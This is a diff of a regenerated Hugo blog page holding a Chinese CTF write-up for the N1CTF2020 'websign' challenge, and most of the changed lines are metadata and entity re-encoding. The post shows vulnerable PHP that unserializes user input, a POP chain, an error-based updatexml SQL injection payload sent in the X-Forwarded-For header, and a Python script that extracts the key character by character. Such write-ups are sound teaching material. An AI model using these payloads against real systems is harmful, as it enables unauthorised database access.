@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.110.0"><meta name="theme-color" content="#fff" />
     <meta name="color-scheme" content="light dark">
 
     
@@ -21,7 +21,7 @@
 
     
     
-        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.d82c753d66fbef2856c2724a5780616edad8aec63de7b22ad9f0da04399cf246.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.1a7822cfcef5444fb929909731e9fd1bdfdbe1d6148f6085416ab3527d76d403.js"></script>
 
     
 
@@ -57,7 +57,7 @@
         "@context": "https://schema.org",
         "@type": "BlogPosting",
         "datePublished": "2020-10-20T00:00:00+00:00",
-        "dateModified": "2022-03-29T10:50:56+08:00",
+        "dateModified": "2022-03-29T10:50:58+08:00",
         "url": "https://blog.wh1sper.com/posts/n1ctf2020/",
         "headline": "N1CTF2020",
         "description": "Nu1L战队主办的比赛",
@@ -106,7 +106,7 @@
 <meta property="og:locale" content="zh" /><meta property="og:image" content="https://blog.wh1sper.com/icons/apple-touch-icon.png" />
     <meta property="og:type" content="article" />
     <meta property="article:published_time" content="2020-10-20T00:00:00&#43;00:00" />
-    <meta property="article:modified_time" content="2022-03-29T10:50:56&#43;08:00" />
+    <meta property="article:modified_time" content="2022-03-29T10:50:58&#43;08:00" />
     
     <meta property="article:section" content="posts" />
 
@@ -243,7 +243,7 @@
     
     
         
-        <time datetime="2022-03-29T10:50:56&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.3.29</time>
+        <time datetime="2022-03-29T10:50:58&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.3.29</time>
     
     
     
@@ -295,19 +295,19 @@ class ip {
     public function waf($info){
     }
     public function __construct() {
-        if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
-            $this-&gt;ip = $this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']);
+        if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){
+            $this-&gt;ip = $this-&gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);
         }else{
-            $this-&gt;ip =$_SERVER[&quot;REMOTE_ADDR&quot;];
+            $this-&gt;ip =$_SERVER[&#34;REMOTE_ADDR&#34;];
         }
     }
     public function __toString(){
-        $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;********&quot;,&quot;n1ctf_websign&quot;);
-        $sqlquery=sprintf(&quot;INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')&quot;,$this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']),time());
+        $con=mysqli_connect(&#34;localhost&#34;,&#34;root&#34;,&#34;********&#34;,&#34;n1ctf_websign&#34;);
+        $sqlquery=sprintf(&#34;INSERT into n1ip(`ip`,`time`) VALUES (&#39;%s&#39;,&#39;%s&#39;)&#34;,$this-&gt;waf($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]),time());
         if(!mysqli_query($con,$sqlquery)){
             return mysqli_error($con);
         }else{
-            return &quot;your ip looks ok!&quot;;
+            return &#34;your ip looks ok!&#34;;
         }
         mysqli_close($con);
     }
@@ -320,27 +320,26 @@ class flag {
         $this-&gt;ip = $ip;
     }
     public function getflag(){
-        if(md5($this-&gt;check)===md5(&quot;key****************&quot;)){
-            readfile('/flag');
+        if(md5($this-&gt;check)===md5(&#34;key****************&#34;)){
+            readfile(&#39;/flag&#39;);
         }
         return $this-&gt;ip;
     }
     public function __wakeup(){
-        if(stristr($this-&gt;ip, &quot;n1ctf&quot;)!==False)
-            $this-&gt;ip = &quot;welcome to n1ctf2020&quot;;
+        if(stristr($this-&gt;ip, &#34;n1ctf&#34;)!==False)
+            $this-&gt;ip = &#34;welcome to n1ctf2020&#34;;
         else
-            $this-&gt;ip = &quot;noip&quot;;
+            $this-&gt;ip = &#34;noip&#34;;
     }
     public function __destruct() {
         echo $this-&gt;getflag();
     }
  
 }
-if(isset($_GET['input'])){
-    $input = $_GET['input'];
+if(isset($_GET[&#39;input&#39;])){
+    $input = $_GET[&#39;input&#39;];
     unserialize($input);
 }
-
 </code></pre><p>思路是利用stristr函数触发__toString，然后在XFF头来进行一个sql注入</p>
 <pre tabindex="0"><code>$pop = new flag();
 $pop-&gt;ip = new ip();
@@ -348,29 +347,29 @@ echo serialize($pop);
 </code></pre><p>页面回显就只会有noip和welcome to n1ctf2020两种，因为__toString方法里面只有return，所以我们并不能直接看到mysql的回显（无论成功与否），只能利用两种回显来判断我们的sql语句是否逻辑正确。</p>
 <p>简单fuzz了一下，过滤了like、sleep、BENCHMARK，不能延时注入。</p>
 <p>因为他<code>return mysqli_error($con);</code>返回了MySQL的报错信息，我们便可以报错注入；</p>
-<pre tabindex="0"><code>' or updatexml(1,concat(0x7e,(select if((1=1),'n1ctf',0)),0x7e),1) or '
+<pre tabindex="0"><code>&#39; or updatexml(1,concat(0x7e,(select if((1=1),&#39;n1ctf&#39;,0)),0x7e),1) or &#39;
 </code></pre><p>1=1和1=0分别返回了不同的信息。</p>
 <p>exp：</p>
 <pre tabindex="0"><code>import requests
  
-url = 'http://101.32.205.189/index.php?input=O:4:&quot;flag&quot;:2:{s:2:&quot;ip&quot;;O:2:&quot;ip&quot;:1:{s:2:&quot;ip&quot;;i:1;}s:5:&quot;check&quot;;s:4:&quot;test&quot;;}'
-result = ''
+url = &#39;http://101.32.205.189/index.php?input=O:4:&#34;flag&#34;:2:{s:2:&#34;ip&#34;;O:2:&#34;ip&#34;:1:{s:2:&#34;ip&#34;;i:1;}s:5:&#34;check&#34;;s:4:&#34;test&#34;;}&#39;
+result = &#39;&#39;
 req = requests.session()
 for x in range(1, 50):
     high = 127
     low = 32
     mid = (low + high) // 2
     while high &gt; low:
-        #babyselect = &quot;database()&quot;#n1ctf_websign
-        #babyselect = &quot;(select group_concat(table_name) from information_schema.tables where table_schema=database())&quot;#n1ip,n1key
-        #babyselect = &quot;(select group_concat(column_name) from information_schema.columns where table_name='n1key')&quot;#id,key
-        babyselect = &quot;(select `key` from n1key)&quot;#n1ctf20205bf75ab0a30dfc0c
-        select = &quot;ascii(substr({},{},1))&gt;{}&quot;.format(babyselect, x, mid)
-        payload = &quot;' or updatexml(1,concat(0x7e,(select if(({}),'n1ctf',0)),0x7e),1) or '&quot;.format(select)
-        data = {&quot;X-Forwarded-For&quot;: payload}
+        #babyselect = &#34;database()&#34;#n1ctf_websign
+        #babyselect = &#34;(select group_concat(table_name) from information_schema.tables where table_schema=database())&#34;#n1ip,n1key
+        #babyselect = &#34;(select group_concat(column_name) from information_schema.columns where table_name=&#39;n1key&#39;)&#34;#id,key
+        babyselect = &#34;(select `key` from n1key)&#34;#n1ctf20205bf75ab0a30dfc0c
+        select = &#34;ascii(substr({},{},1))&gt;{}&#34;.format(babyselect, x, mid)
+        payload = &#34;&#39; or updatexml(1,concat(0x7e,(select if(({}),&#39;n1ctf&#39;,0)),0x7e),1) or &#39;&#34;.format(select)
+        data = {&#34;X-Forwarded-For&#34;: payload}
         resp = requests.get(url, headers=data)  #GET:params=data POST:data=data
         print(payload)
-        if resp.text.count('welcome to n1ctf2020') == 2:  #
+        if resp.text.count(&#39;welcome to n1ctf2020&#39;) == 2:  #
             low = mid + 1
         else:
             high = mid
@@ -378,13 +377,13 @@ for x in range(1, 50):
     # print(mid)
     result += chr(int(mid))
     print(result)
-print(&quot;end.......&quot;)
+print(&#34;end.......&#34;)
 print(result)
 </code></pre><p>key是关键字，只能select <code>key</code></p>
 <p>得到key：n1ctf20205bf75ab0a30dfc0c</p>
 <pre tabindex="0"><code>$pop = new flag();
 $pop-&gt;ip = new ip();
-$pop-&gt;check = &quot;n1ctf20205bf75ab0a30dfc0c&quot;;
+$pop-&gt;check = &#34;n1ctf20205bf75ab0a30dfc0c&#34;;
 echo serialize($pop);
 </code></pre><p>传参得到：</p>
 <p>n1ctf{you_g0t_1t_hack_for_fun}</p>
@@ -416,7 +415,7 @@ echo serialize($pop);
 
         
     <div class="updated-badge-container">
-        <span title="Updated @ 2022-03-29 10:50:56 CST" style="cursor:help">
+        <span title="Updated @ 2022-03-29 10:50:58 CST" style="cursor:help">
 
 <svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2022-03-29</text><text x="915" y="140" textLength="650" transform="scale(.1)">2022-03-29</text></g></svg>
         </span></div>
